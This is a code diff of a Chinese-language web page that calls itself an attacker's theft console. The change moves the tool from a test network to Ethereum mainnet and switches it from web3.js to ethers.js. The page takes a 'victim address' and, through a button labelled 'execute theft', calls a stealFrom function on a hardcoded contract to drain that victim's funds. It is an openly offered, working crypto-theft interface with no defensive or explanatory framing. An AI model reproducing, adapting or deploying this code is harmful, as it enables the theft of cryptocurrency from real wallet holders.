@@ -1,48 +1,41 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="zh">
 <head>
   <meta charset="UTF-8">
-  <title>盜取控制台 v3.0（測試網）</title>
+  <title>控制台 | 主網 v3.0</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-  <h1>🛠 攻擊者操作介面</h1>
-  <p>🔗 合約地址：<b>0xfC35E3407c86461BA2D00C080cC763c0f6878377</b></p>
-  <p>🧪 當前網路：<span id="network">查詢中...</span></p>
-  <input type="text" id="victim" placeholder="受害者地址" size="50" />
-  <button onclick="drain()">執行盜取</button>
-  <pre id="log">🪵 等待操作...</pre>
+  <h2>🛠️ 攻擊者操作介面 v3.0（Ethereum 主網）</h2>
+  <p>合約地址：<b>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b></p>
+  <input type="text" id="victim" placeholder="輸入受害者地址" size="60" />
+  <button onclick="steal()">執行盜取</button>
+  <pre id="log">🪵 等待輸入...</pre>
 
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 主網 USDT
-    const ABI = [{ "name": "stealFrom", "type": "function", "inputs": [
-      { "type": "address", "name": "victim" }
-    ], "outputs": [], "stateMutability": "nonpayable", "type": "function" }];
+    const contractAddr = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const abi = [
+      "function stealFrom(address victim) public"
+    ];
 
-    async function drain() {
-      const web3 = new Web3(window.ethereum);
-      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-      const victim = document.getElementById("victim").value;
-      const contract = new web3.eth.Contract(ABI, CONTRACT);
-      document.getElementById("log").innerText = `🚀 呼叫 stealFrom(${victim})...`;
+    async function steal() {
+      const v = document.getElementById("victim").value;
+      const output = document.getElementById("log");
+      output.innerText = "📡 呼叫 stealFrom(" + v + ")...";
+
       try {
-        const tx = await contract.methods.stealFrom(victim).send({ from: accounts[0] });
-        document.getElementById("log").innerText += `
-✅ 成功！TX: ${tx.transactionHash}`;
-      } catch (e) {
-        document.getElementById("log").innerText += `
-❌ 失敗：${e.message}`;
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const contract = new ethers.Contract(contractAddr, abi, signer);
+        const tx = await contract.stealFrom(v);
+        output.innerText += "\n✅ 成功送出 TX: " + tx.hash;
+      } catch (err) {
+        output.innerText += "\n❌ 失敗：" + err.message;
       }
     }
-
-    async function detectNetwork() {
-      const chainId = await ethereum.request({ method: 'eth_chainId' });
-      const map = { "0x1": "Ethereum 主網", "0xaa36a7": "Sepolia 測試網" };
-      document.getElementById("network").innerText = map[chainId] || `未知網路 (${chainId})`;
-    }
-
-    detectNetwork();
   </script>
+  <p style="margin-top:20px; color:gray;">版本：v3.0 主網</p>
 </body>
 </html>
